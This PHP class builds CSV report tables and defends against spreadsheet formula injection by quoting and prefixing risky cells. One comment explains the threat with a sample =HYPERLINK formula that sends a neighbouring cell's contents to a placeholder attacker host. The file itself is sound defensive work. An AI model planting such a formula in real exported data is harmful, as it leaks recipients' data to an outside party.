<?php

require_once('plHtmlReportTable.php');

/**
* plCsvReportTable - creates an individual HTML table in a report
* works with plCsvReport and plHtmlReportTable as part of a collection of 
* tables stored in an array - stored in the plCsvReport $tables array.
*
* @author Aaron Worley <amworley@pikasoftware.com>;
* @version 1.0
* @package Danio
*/
class plCsvReportTable extends plHtmlReportTable 
{
	public function __construct(){
		$this->title = '';
		$this->header_contents = '';
		$this->grid_contents = '';
	}
	
	public function set_header($a){
		$this->header_contents = $this->format_csv_row($a);
	}

	public function add_row($a){
		$this->grid_contents .= $this->format_csv_row($a);
	}

	
	public function build(){
		$buffer = '';
		/*	The title is a one-column row, so it goes through the same
			writer as every other row. It used to be built by hand with
			addslashes(), which got both halves wrong: a quote in the
			title came out as \" where CSV wants "" -- which ends the
			field for Excel, LibreOffice and Sheets alike -- and the
			title was the one line in the file that never saw
			guard_csv_formula(). fputcsv() supplies the line ending, and
			the trailing comma goes with the hand-built version: it was
			a phantom empty second column.
			
			Table titles are not all literals. cms/reports/timecodes
			passes a staff name, cms/reports/issue_sponsor passes a menu
			label and cms/reports/time interpolates a user name, so this
			line carries org-editable text into the export.
		*/
		$buffer .= $this->format_csv_row(array($this->title));
		$buffer .= $this->header_contents . $this->grid_contents;
		
		return $buffer;
	}
	
	/**
	 * Format one value as a CSV cell, comma included, for a caller
	 * assembling a row by concatenation.
	 *
	 * Nothing in this tree calls it any more -- build() was the only
	 * caller and now uses format_csv_row() -- but it is public on a lib
	 * class, so it stays and it has to be correct: RFC 4180 doubling
	 * rather than addslashes(), and the same formula guard the rows get.
	 */
	public function format_csv_cell($str){
		$guarded = $this->guard_csv_formula($str);
		
		return '"' . str_replace('"', '""', $guarded) . '",';
	}
	
	/**
	 * Neutralise spreadsheet formula injection in a single cell.
	 *
	 * fputcsv() below produces correct CSV, and correct CSV is exactly
	 * the problem: Excel, LibreOffice and Sheets all treat a cell whose
	 * text begins with = + - @ (or a leading tab or CR) as a formula and
	 * evaluate it when the file is opened. A client whose last name is
	 * stored as =HYPERLINK("http://attacker/"&A1,"Click") sends the
	 * neighbouring cell to whoever opens the export, with nothing having
	 * run inside OCM at all. Case and contact fields are typed in by
	 * staff, and reports are routinely mailed to funders, so the person
	 * whose spreadsheet evaluates it is often outside the org.
	 *
	 * The fix is the standard one: prefix a single quote, which every
	 * spreadsheet strips on display and reads as "this is text".
	 *
	 * The is_numeric() guard is about correctness rather than security.
	 * Every negative number in every financial report starts with '-',
	 * and a blanket prefix would turn -1500.00 into the text '-1500.00
	 * in all of them, breaking sums in a way nobody notices until a
	 * funder's totals disagree. A value PHP already reads as a number
	 * cannot be a formula, so it passes through untouched.
	 */
	private function guard_csv_formula($value)
	{
		$str = (string) $value;
		
		/*	Thousands separators come off before the numeric test because
			the money columns are already formatted by the time they get
			here, and "-1,500.00" is a number to every spreadsheet that
			will open this file. Testing the raw string would quote it as
			text and silently break the totals on financial exports --
			the exact damage this guard must not cause. Removing the
			commas cannot create a false negative: a string that reads as
			a plain number once they are gone has no function call or
			cell reference left in it to evaluate.
		*/
		if ($str === '' || is_numeric(str_replace(',', '', $str)))
		{
			return $str;
		}
		
		if (strpbrk(substr($str, 0, 1), "=+-@\t\r") !== false)
		{
			return "'" . $str;
		}
		
		return $str;
	}
	
	private function format_csv_row($row = array()) 
	{
		$guarded = array();
		
		foreach ($row as $key => $val)
		{
			$guarded[$key] = $this->guard_csv_formula($val);
		}
		
		$handle = fopen('php://memory', 'w');
		fputcsv($handle, $guarded);
		fseek($handle, 0);
		return stream_get_contents($handle);
	}
}

?>